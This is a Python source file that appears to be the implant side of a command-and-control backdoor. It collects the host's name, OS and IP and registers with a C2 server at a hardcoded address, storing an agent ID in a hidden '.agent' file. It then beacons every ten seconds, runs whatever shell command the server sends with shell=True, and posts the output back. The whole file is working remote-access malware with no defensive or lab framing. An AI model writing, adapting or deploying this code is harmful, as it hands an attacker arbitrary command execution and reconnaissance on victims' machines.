import requests
import platform
import socket
import os
import time
import subprocess

C2_SERVER = "http://127.0.0.1:8000"
AGENT_FILE = ".agent"

# ---------------------------
# Collect System Info
# ---------------------------
def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "username": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "ip": socket.gethostbyname(socket.gethostname())
    }


# ---------------------------
# Register Agent
# ---------------------------
def register():
    data = get_system_info()

    response = requests.post(f"{C2_SERVER}/register", json=data)
    agent_id = response.json()["agent_id"]

    with open(AGENT_FILE, "w") as f:
        f.write(agent_id)

    print("[+] Registered:", agent_id)
    return agent_id


# ---------------------------
# Get Agent ID
# ---------------------------
def get_agent_id():
    if os.path.exists(AGENT_FILE):
        with open(AGENT_FILE, "r") as f:
            return f.read().strip()

    return register()


AGENT_ID = get_agent_id()


# ---------------------------
# Execute command
# ---------------------------
def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True).decode()
    except Exception as e:
        output = str(e)

    return output


# ---------------------------
# Beacon Loop
# ---------------------------
def beacon():
    while True:
        try:
            response = requests.post(f"{C2_SERVER}/beacon/{AGENT_ID}")
            data = response.json()

            task = data.get("task")

            if task:
                print("[+] Task received:", task)

                result = execute_command(task)

                requests.post(
                    f"{C2_SERVER}/result/{AGENT_ID}",
                    json={
                        "command": task,
                        "output": result
                    }
                )

        except Exception as e:
            print("Beacon error:", e)

        time.sleep(10)


print("[*] Agent started")
beacon()